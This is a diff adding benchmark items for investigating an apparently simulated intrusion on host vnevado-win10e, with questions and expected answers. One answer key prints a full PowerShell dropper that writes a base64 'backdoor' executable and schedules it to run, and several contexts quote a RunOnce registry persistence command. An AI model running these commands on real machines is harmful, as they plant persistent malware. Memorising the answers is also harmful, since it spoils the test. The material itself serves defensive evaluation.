@@ -1,0 +1,253 @@
+tasks:
+  - task_id: incident_34_task_31
+    title: incident_34_task_31
+    description: "A connected suspicious activity also involved a PowerShell command execution. Can you provide the ProcessID and command line used for the process that executed the PowerShell command in this incident?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "There was a security incident where an uncommon file was created and added to a Run Key on a machine. A file was observed being created and put into a Registry Key in order to be run after a reboot. This incident involved the IP address `72.5.72.208` and a process with the command line: `reg add hkcu\\software\\microsoft\\windows\\currentversion\\runonce /f /v yrei /t reg_expand_sz /d %userprofile%\\desktop\\winatp-intro-backdoor.exe` and ProcessId `10208`. This could suggest that an attacker may be trying to maintain persistence on the machine."
+      question: "A connected suspicious activity also involved a PowerShell command execution. Can you provide the ProcessID and command line used for the process that executed the PowerShell command in this incident?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "ProcessId: 8604, CommandLine: \"powershell.exe\" -w movedn -exec bypass -command cd /;$filebase64prefix = '';$filebase64prefix= $filebase64prefix + 'tvq';$filebase64prefix= $filebase64prefix + 'qaam';$filebase64prefix= $filebase64prefix + 'aaaae';$filebase64prefix= $filebase64prefix + 'aaaa';$filebase64prefix= $filebase64prefix + '/';$filebase64prefix= $filebase64prefix + '/';$filebase64prefix= $filebase64prefix + '8aalgaaaaaaaaaqaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagaaaaa4fug4atannibgbtm0hvghpcybwcm9ncmftignhbm5vdcbizsbydw4gaw4gre9tig1vzguudq0kjaaaaaaaaabqrqaaziycad/vl1oaaaaaaaaaapaaigalajaaabqaaaagaaaaaaaaaaaaaaagaaaaaabaaqaaaaagaaaaagaabaaaaaaaaaagaaaaaaaaaabgaaaaagaaaaaaaamayiuaaeaaaaaaaabaaaaaaaaaaaaqaaaaaaaaiaaaaaaaaaaaaaaqaaaaaaaaaaaaaaaaaaaaaaaaaabaaadmbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajdiaabwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';$filebase64prefix= $filebase64prefix + 'aaaagaabiaaaaaaaaaaaaaaaudgv4daaaafwtaaaaiaaaabqaaaacaaaaaaaaaaaaaaaaaaagaabglnjzcmmaaadmbaaaaeaaaaagaaaafgaaaaaaaaaaaaaaaaaaqaaaqaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabiaaaaagafajgiaacmdwaaaqaaaasaaayaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeansbaaaekiica30baaaekh4cewiaaaqqigidfqiaaaqqhgj7awaabcoiagn9awaabcoaezafadwaaaabaaaraaj7bgaabhibaabwfgqaaaqsap4vagaaahiaaygcaaagabiabcgeaaagabiabsggaaagaazvaqaakwaqegjygqaacb5+bqaabhmmaaakfqyaaaqcka0aaaoakgatmaqauqaaaa';$filebase64prefix= $filebase64prefix + 'iaabesap4vdwaaariagygoaaakabiaiqaaaaaaiaaaka8aaaoaegagaaagacgqaaakaaaabaaabbingaaaasuwcmcaahcijrdyewaackkabqaabcoaaaatmauauqaaaamaabeafgoaaaqxaliacgaabaqsf3ljaabwbg8raaakcueaahaoegaacisfcuuaahakfgkaaar/cgaabhlnaabwkbmaaaocawyofaaacm8haaagacoaaaabmamaraaaaaqaabeaf3ltaabwfcgkaaagabykacgvaaakcgsbahaofgaacigxaaakcwdvgaaacnmzaaakdah+caaabcgaaaakcgdebsyaan4acp4bahbyrgeaccgbaaakjnkeaqbwck8cahaogwaaciygdqksigbydgmachkqawbwkbsaaaomcp4bahbyrgeaccgbaaakjgaxcrgdahaukaoaaayactodahaohaaacgaohqaaciyqaraaaaaae';$filebase64prefix= $filebase64prefix + 'aaxqqafdgaaasicka0aaaoakozyraqachmzaaakgagaaarzcaaaboajaaaefmqacgaabcoaqlnkqgeaaqaaaaaadaaaahy0ljaumzazmtkaaaaabqbsaaaanaqaacn+aacgbaaaraqaacntdhjpbmdzaaaaaewjaabcbaaai1vtakgnaaaqaaaai0dvsuqaaac4dqaa1aeaacncbg9iaaaaaaaaaaiaaafxhaibcqgaaad6atmafgaaaqaaab4aaaaeaaaacgaaaa0aaaakaaaahqaaaaiaaaauaaaabaaaaaeaaaadaaaabgaaaaeaaaacaaaaaqaaaaaagqibaaaaaaaganub5wmgapub5wmgafwbmgmpaaceaaagaisbyamgae4byamgalgbcqmgaj8bpqigacabigigaoga0wigadmb5wmgaambmgmgahabmgmgahqe0wigaeieigigajcaigigaaed0wigacsd0wikafedmgmg';$filebase64prefix= $filebase64prefix + 'ackeigigaiucigigalodigigab8eigigagyc0wigaaea0wigahse0wigahecmwakafuemgmgam4a0wigahad0wiaaaaakgaaaaaaaqabaakbeac8abmakqabaaeaaqaqajeaewa5aaqabwaaabaaywitadkabwakaaeargc5aaeaxqc8aaeaewc5abyagwo/adeaxqtdaaeaewthafaavwk5abeacadlabeahappabea2gltaeggaaaaaiyiowbyaaeaucaaaaaahgitabuaaqbziaaaaacgcjac1gacagegaaaaaiyioqiqaaiaaiaaaaaahgg/a1gaawbyiaaaaacgcegdfqadahwgaaaaaiyatwdaaaqaxcaaaaaahhinawyabwdkiaaaaacrgjmd4qahaeqhaaaaajea8gdlaacapceaaaaalgdxau0acgbsigaaaacggi0dbgalahuiaaaaajeykwphaasaaaababmcaaababm';$filebase64prefix= $filebase64prefix + 'caaababmcaaabamgaaaacal8caaadah8daaabalicaaacag0cebadadudaaabad0ecqcnaweaeqcnawyagqcnawoakqcnaxaamqcnaxuaoqcnaxuaiqcnaxuasqcnawyawqcnawyaaqcnaxoagqaaasuagqcnazqacqcnawyaeqb7akiaeqcta0gaeqawbe4acqbkalgawqbtbfwayqbkammawqbtbgga0qcvbhca2qdgaggamqbha3samqd2algaiqcnaxuaiqdlaoea4qchbika6qdwajaa6qcnbjuadgacakmaegalalqaiablalmbiqblalmbiqbtalgblgalapsalgataaqblgabacmblgajacwblgaradiblgazafwblga7agkbqablalmbqqblalmbqqbtalgbqwbdamebyablalmbyqblalmbyqbtalgbgablalmboablalmbwablalmbiaa9afqabgacaaeaaadcapmaaa';$filebase64prefix= $filebase64prefix + 'clavcaaab6a/maagabaamaaqacaamaagadaauaaqaeaauaagafaacaaqagaacabiaaaaeaaaaaaaaaaaaaaaaadgiaaaqaaaaaaaaaaaaaajoapqaaaaaabaaaaaaaaaaaaaaamgdtagaaaaaxac8aaaaavuluddy0ahnfc2vuc2vsuzqav2luqvrqsw50cm9cywnrzg9vcljtnaa8tw9kdwxlpgbtexn0zw0usu8abxnjb3jsawiapfn0ywdlpmtfx0jhy2tpbmdgawvszaa8sxntdwnjzxnzznvspmtfx0jhy2tpbmdgawvszaa8sw5mbz5rx19cywnraw5nrmllbgqavhjhy2uarxzlbnrtb3vyy2uaz2v0x1n0ywdlahnldf9tdgfnzqbucmfjzuf0dgfja1n0ywdlahn0ywdlaenvbnnvbguav3jpdgvmaw5laenvbwjpbmuavmfsdwvuexblafryywnlqxr0ywnrughhc2uar';$filebase64prefix= $filebase64prefix + 'gvidwdnzxjccm93c2fibgvtdgf0zqbxcml0zqbfdmvuderhdgfbdhryawj1dguaq29tcglszxjhzw5lcmf0zwrbdhryawj1dguar3vpzef0dhjpynv0zqbezwj1z2dhymxlqxr0cmlidxrlaerlynvnz2vyqnjvd3nhymxlqxr0cmlidxrlaenvbvzpc2libgvbdhryawj1dguavgfyz2v0rnjhbwv3b3jrqxr0cmlidxrlaefzc2vtymx5rmlszvzlcnnpb25bdhryawj1dguaq29tcglsyxrpb25szwxhegf0aw9uc0f0dhjpynv0zqbsdw50aw1lq29tcgf0awjpbgl0euf0dhjpynv0zqb2ywx1zqbucm9qlmv4zqbtexn0zw0urglhz25vc3rpy3muvhjhy2luzwbtexn0zw0uunvudgltzs5wzxjzaw9uaw5nagnfbg9mavn0cmluzwbub1n0cmluzwbtc2caugf0aabucm9q';$filebase64prefix= $filebase64prefix + 'ahnldf9mzxzlbabfdmvudexldmvsagdldf9jc1n1y2nlc3nmdwwac2v0x0lzu3vjy2vzc2z1babpc1n1y2nlc3nmdwwaaxn1y2nlc3nmdwwauhjvz3jhbqbtexn0zw0ac190cmfjzu51bqbvcf9mzxnzvghhbgbnywluagdldf9qcm9kdwn0vmvyc2lvbgbtexn0zw0uumvmbgvjdglvbgbuzwxlbwv0cnlpchrpb25zafbyb2nlc3madgvszw1ldhj5vhjhaxrzaenvbmnhdabpymply3qarw52axjvbm1lbnqau3rhcnqaumvhzetleqbnzxrfu3lzdgvtrglyzwn0b3j5aaaaaaaxqqb0ahqayqbjagsauwb0ageazwblaabntqbpagmacgbvahmabwbmahqalgbxagkabgbkag8adwbzac4auwblag4acwblac4aqqb0ahqayqbjagsauwbjaguabgbhahiaaqbvaaatrqbuafcaxwbhafiatwbvafaaae17aduarqbdaeiamabcaeeaqwataeiaoqazadaalqa0adcarga1ac0aqqa4aeeanaataeuaoaayaduamwa1ad';$filebase64prefix= $filebase64prefix + 'iaoqbfaeqaqga3ah0aardfahgaywblahaadabpag8abga6acaaaamuaaabaaveadiaab1bahqadabhagmaawagahmadabhahiadablagqaaicrqwa6afwauabyag8azwbyageabqagaeyaaqbsaguacwbcafcaaqbuagqabwb3ahmaiabeaguazgblag4azablahiaiabbagqadgbhag4aywblagqaiabuaggacgblageadaagafaacgbvahqazqbjahqaaqbvag4axabnahmauwblag4acwblac4azqb4aguaaa9jag0azaauaguaeablaacany8aywagafiarqbhacaarabfaewarqbuaeuaiabiaesaqwbvafwauwbpaeyavabxaeeaugbfafwatqbpagmacgbvahmabwbmahqaxabxagkabgbkag8adwbzafwaqwb1ahiacgblag4adabwaguacgbzagkabwbuafwaugb1ag4at';$filebase64prefix= $filebase64prefix + 'wbuagmazqagac8azgagac8adgagafqacgbvagoaaiellwbjacaaugbfaecaiabbaeqaraagaegaswbdafuaxabtae8argbuafcaqqbsaeuaxabnagkaywbyag8acwbvagyadabcafcaaqbuagqabwb3ahmaxabdahuacgbyaguabgb0afyazqbyahmaaqbvag4axabsahuabgbpag4aywblacaalwbmacaalwb2acaavabyag8aagagac8adaagafiarqbhaf8arqbyafaaqqboaeqaxwbtafoaiaavagqaiabeacuadqbzaguacgbwahiabwbmagkabablaf4ajqbcagqazqbzagsadabvahaaxabxagkabgbbafqauaataekabgb0ahiabwataeiayqbjagsazabvag8acgauaguaeablaaezcwbjaggadabhahmaawbzac4azqb4aguaaccvagqazqbsaguadablacaalwbuae4a';$filebase64prefix= $filebase64prefix + 'iabuahiabwbqacaalwbgaaahqqb0ahqayqbjagsaiabmagkabgbpahmaaablagqalgaaaueadab0ageaywbracaacwbjaguabgbhahiaaqbvacaaywbvag0acabsaguadablagqaiaakafaacgblahmacwagageabgb5acaaawblahkaiab0ag8aiabjagwabwbzagualgauac4aabcxadaalga0adgamwawac4amaauadaaamnvfqry/lxgmlcxtah6lpuabcabaqgdiaabbsabarerbcabaqieiaebdgugaqermqqhareictabaweoet0eaaqkareiccadaq4rur0obacbet0fiaebevufiaebevkfiaebev0dbweoayaadgyaaw4odg4eiaeodguaag4odgghbaistrjfagmaaa4faaestq4haaicekusrqyaahjxdg4eaaebdgqaabf5cld6xfyznocjefqacgbvagoalgblahg';$filebase64prefix= $filebase64prefix + 'azqaeaaaaaaigdgigagmget0dbh0oawysqqmgekudbhimagylayaaagygaweoag4daaabbwadaqioekkfaaebhq4dkaaoaygaaggbaagaaaaaab4baaeavaiwv3jhce5vbkv4y2vwdglvblrocm93cweiaqahaqaaaaafaqaaaaapaqaknjg4zjvimwuty2fhni00ywjllwfkzgutytq1yzq0ywe3ymywaaamaqahms4wljaumaaasqeagi5orvrgcmftzxdvcmssvmvyc2lvbj12nc42aqbudhrgcmftzxdvcmteaxnwbgf5tmftzriutkvuiezyyw1ld29yaya0ljyeaqaaaagbaaaaaaaaabebaaeava4etmftzqvtdgfnzqaaaaaap++xwgaaaaacaaaahaeaaeayaabafaaaulneuxnxl924kntdggejfnqsvcwbaaaaqzpczgv2xfjlcg9zxerjwvxxaw5bvfbjbnryb0jhy2';$filebase64prefix= $filebase64prefix + 'tkb29yulm0xg9ialxezwj1z1xucm9qlnbkygaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';$filebase64suffix= 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa==';$filebase64= $filebase64prefix + $filebase64suffix;$file= [convert]::frombase64string([string]$filebase64);$filename= 'winatp-intro-backdoor.exe';$desktop=[environment]::getfolderpath('desktop');$fullpath = join-path $desktop $filename;[io.file]::writeallbytes($fullpath,$file);copy $fullpath $desktop;schtasks /create /sc once /tn yrei /tr $fullpath /st (get-date).addminutes(-2).tostring('hh:mm') /f;$settings = new-scheduledtasksettingsset -allowstartifonbatteries -dontstopifgoingonbatteries;set-scheduledtask -taskname 'yrei' -settings $settings;schtasks /run /tn yrei"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "An uncommon file was created and added to a Run Key by an account with SID `S-1-5-21-1870156660-7534030218-135086563-1193`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspicious process with Process ID `8604` executed a PowerShell command on `2024-06-26t12:00:39.2886108z` to create a file named `winatp-intro-backdoor.exe` on the desktop and set up a scheduled task to run it."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_32
+    title: incident_34_task_32
+    description: "There is a related process that might have been used to schedule a task on the machine. Can you identify the file name of the process used to schedule the task?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "In the context of recent security incidents, we have observed suspicious PowerShell command line activity on the machine `vnevado-win10e`. The presence of this activity indicates that PowerShell may have been used by attackers to bypass security mechanisms, execute their payloads in memory, or perform lateral movements without leaving traces. Furthermore, the suspicious command line involves the execution of `PowerShell.exe` with certain modules for potential malicious purposes."
+      question: "There is a related process that might have been used to schedule a task on the machine. Can you identify the file name of the process used to schedule the task?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "schtasks.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A suspicious PowerShell command line activity was observed, where the process `schtasks.exe` was involved."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_33
+    title: incident_34_task_33
+    description: "Following the suspicious PowerShell activity, what malicious activity was identified involving a file on the machine?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "During an analysis of a security incident, we observed suspicious activity on host `vnevado-win10e` involving the use of PowerShell. PowerShell is often utilized by attackers to execute payloads in memory, bypassing security mechanisms. This incident is linked with further malicious actions on the same host."
+      question: "Following the suspicious PowerShell activity, what malicious activity was identified involving a file on the machine?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "Powershell dropped a suspicious file on the machine and executed it."
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A process executed PowerShell to download a file or run an encoded command on host `vnevado-win10e`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "PowerShell then dropped a suspicious file named `winatp-intro-backdoor.exe` and executed it on the same machine."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_34
+    title: incident_34_task_34
+    description: "What is the hostname of the device that was involved in the automated investigation?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "A security incident involved a file named `winatp-intro-backdoor.exe` being created and added to a Registry Key on a machine on 2024-07-04. The file was set to run after a reboot, suggesting an attempt by an attacker to maintain persistent access. An account `samuelf` with specific SIDs and AadUserId is linked to this incident. The related IP address is `72.5.72.208`, and the process information indicates a command line involving the Registry Key modification. Following this, an automated investigation was manually initiated by a known user on the affected device."
+      question: "What is the hostname of the device that was involved in the automated investigation?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "vnevado-win10e.vnevado.alpineskihouse.co"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "An uncommon file was created and added to a Run Key on the host `vnevado-win10e`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "An automated investigation was manually started by `u141(u141@ash.alpineskihouse.co)` on the device with AadDeviceId `02b8f519-1123-4228-b32a-ccb78af3449f` (hostname: `vnevado-win10e.vnevado.alpineskihouse.co`)."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_35
+    title: incident_34_task_35
+    description: "What was the name of the process involved in using Task Scheduler to create the task?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "During the investigation of a recent security incident involving suspicious Task Scheduler activity, it was observed that a process `powershell.exe` was executed on the host `vnevado-win10e` by the user `samuelf` with user ID `16320fec-8d90-403b-b7fe-78f715d4728d`. This process was used to create a scheduled task to run a potentially malicious file `winatp-intro-backdoor.exe`, which may indicate an attempt to establish persistence."
+      question: "What was the name of the process involved in using Task Scheduler to create the task?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "schtasks.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A process invoked by `schtasks.exe` was involved in earlier malicious activity and used Task Scheduler to create, modify, or delete a task. This might be an attempt to launch malicious code automatically and establish persistence."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_36
+    title: incident_34_task_36
+    description: "Can you identify the name of the process that was used to create, modify, or delete a task in Task Scheduler as part of this suspicious activity?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "During the investigation of a potential reconnaissance activity involving a suspicious LDAP query, it was found that `winword.exe` was used to execute a command file located at `c:\\scripts\\rs4_winatp-intro-invoice.docm`. This indicates that attackers may be attempting to learn the organization's structure by querying the domain controller for administrative users and groups, with the aim of gaining higher privileges. There is further suspicious activity involving Task Scheduler detected in the same timeframe."
+      question: "Can you identify the name of the process that was used to create, modify, or delete a task in Task Scheduler as part of this suspicious activity?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "schtasks.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A suspicious LDAP query was executed by the account with SID `S-1-5-21-1870156660-7534030218-135086563-1193`, indicating potential reconnaissance activity."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspicious Task Scheduler activity was observed where the process `schtasks.exe` was used to create, modify, or delete a task, likely an attempt to establish persistence."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_37
+    title: incident_34_task_37
+    description: "In relation to this incident, there was a suspicious LDAP query suggesting reconnaissance activity. Could you identify the process and the command line used to execute this LDAP query?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "During a recent security incident, we observed a process `winatp-intro-backdoor.exe` connected to IP `72.5.72.208`, running the command `reg add hkcu\\software\\microsoft\\windows\\currentversion\\runonce /f /v yrei /t reg_expand_sz /d %userprofile%\\desktop\\winatp-intro-backdoor.exe`. This activity suggested an anomaly in the ASEP registry where a suspicious command or file was registered. This might be an attempt by an attacker to maintain persistence even after a reboot."
+      question: "In relation to this incident, there was a suspicious LDAP query suggesting reconnaissance activity. Could you identify the process and the command line used to execute this LDAP query?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "Process Id: 9780, Command Line: \"winword.exe\" c:\\scripts\\rs4_winatp-intro-invoice.docm"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "A suspicious process registered a command or file in the ASEP registry key on the host with AadDeviceId `02b8f519-1123-4228-b32a-ccb78af3449f`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspect LDAP query was executed, likely indicating reconnaissance activity, by the process `winword.exe` using the command line `c:\\scripts\\rs4_winatp-intro-invoice.docm` at `2024-06-26t11:57:20.2959493z`, with Process ID `9780`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_38
+    title: incident_34_task_38
+    description: "Within this incident, what was the name of the process that executed PowerShell to download a file or run an encoded command?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "An uncommon file was observed being created on a machine and added to a Registry Key to ensure it runs after a reboot. This action was part of a larger security incident identified on 2024-07-04, where an attacker might have placed a malicious software to prevent losing access if a machine is turned off. One specific part of this incident involved an IP address `72.5.72.208`, with a process ID `10208` executing a command to add a registry entry that runs a backdoor executable after a reboot."
+      question: "Within this incident, what was the name of the process that executed PowerShell to download a file or run an encoded command?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "powershell.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "An uncommon file was created and added to a Run Key on a host with AadDeviceId `02b8f519-1123-4228-b32a-ccb78af3449f`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A process executed PowerShell with the filename `powershell.exe` to download a file or run an encoded command."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_39
+    title: incident_34_task_39
+    description: "What is the name of the suspicious file dropped and executed by Powershell on the machine?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "An uncommon file was created and added to a Run Key on a machine, which is a tactic an attacker might use to maintain persistence. For more information, refer to the Simulated threat Threat Analytics report available online. The associated IP address for this activity is `72.5.72.208`."
+      question: "What is the name of the suspicious file dropped and executed by Powershell on the machine?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "winatp-intro-backdoor.exe"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "An uncommon file was created and added to a Run Key by the account with AadUserId `16320fec-8d90-403b-b7fe-78f715d4728d`."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "A suspicious file named `winatp-intro-backdoor.exe` was dropped and executed by Powershell on the machine."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+  - task_id: incident_34_task_40
+    title: incident_34_task_40
+    description: "Can you identify the username of the account involved in executing the suspicious PowerShell command?"
+
+    inherit_shared: true
+
+    initial_context:
+      incident_context: "A suspicious PowerShell command was executed, indicating possible malicious activity attempting to download external payloads or execute commands on the device. This activity was flagged as part of an ongoing security investigation."
+      question: "Can you identify the username of the account involved in executing the suspicious PowerShell command?"
+
+    evaluation_config:
+      strategy: static
+      criteria:
+        expected_answers:
+        - "samuelf"
+      scoring:
+        max_score: 1.0
+    subtasks:
+      - subtask_id: checkpoint_1
+        title: Checkpoint 1
+        description: "The account with SID `S-1-5-21-1870156660-7534030218-135086563-1193` executed PowerShell to download a file or run an encoded command."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
+      - subtask_id: checkpoint_2
+        title: Checkpoint 2
+        description: "The account `samuelf` executed PowerShell to download a file or run an encoded command."
+        objective: "Identify key details related to the potential compromise that might help in solving the main task."
